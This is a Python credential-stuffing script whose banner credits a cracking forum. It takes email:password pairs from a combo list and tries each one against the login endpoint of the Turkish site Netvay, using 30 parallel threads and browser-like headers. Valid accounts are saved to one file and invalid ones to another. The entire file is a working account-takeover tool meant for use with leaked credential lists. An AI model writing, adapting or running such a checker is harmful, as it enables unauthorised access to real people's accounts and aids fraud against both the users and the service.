import requests
import concurrent.futures

print("""
BU CHECKER CRACKTURKEY PLATFORMU İÇİN YAPILMIŞ OLUP İBRETİ ALEMDE ÖRNEĞİ BULUNMAYAN BİR CHECKERDIR..

CCCP - Netway Proxyless Checker v.2.0 Başlıyoor""")

def login(email, password):
    url = "https://www.netvay.com/login"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Referer": "https://www.netvay.com/uyelik/giris-yap",
        "Sec-Ch-Ua": "\"Google Chrome\";v=\"123\", \"Not: A-Brand\";v=\"8\", \"Chromium\";v=\"123\""
    }
    data = {
        "email": email,
        "password": password,
        "rememberme": "0"
    }

    try:
        response = requests.post(url, headers=headers, data=data)
        response_json = response.json()

        if "status" in response_json and response_json["status"] == False:
            print("[-] Email:", email, "Şifre:", password, "ile kayıtlı bir kullanıcı bulunamadı")
            with open("calismayan_hesaplar.txt", "a") as file:
                file.write(email + ":" + password + "\n")
        elif response_json == True:
            print("[+] Email:", email, "Şifre:", password, "ile kayıtlı bir kullanıcı bulunmuştur.")
            with open("calisan_hesaplar.txt", "a") as file:
                file.write(email + ":" + password + "\n")
        else:
            print("Beklenmeyen bir yanıt alındı:", response.text)
            with open("calismayan_hesaplar.txt", "a") as file:
                file.write(email + ":" + password + "\n")
    except Exception as e:
        print("Giriş yapılırken bir hata oluştu:", e)
        with open("calismayan_hesaplar.txt", "a") as file:
            file.write(email + ":" + password + "\n")
    
# Combo.txt dosyasından e-posta ve şifreleri oku ve giriş yap
def check_accounts(combo):
    email, password = combo.strip().split(":")
    login(email, password)

with open("combo.txt", "r") as file:
    combos = file.readlines()

with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
    for combo in combos:
        executor.submit(check_accounts, combo)

input("\nÇıkmak için Enter tuşuna basın...")
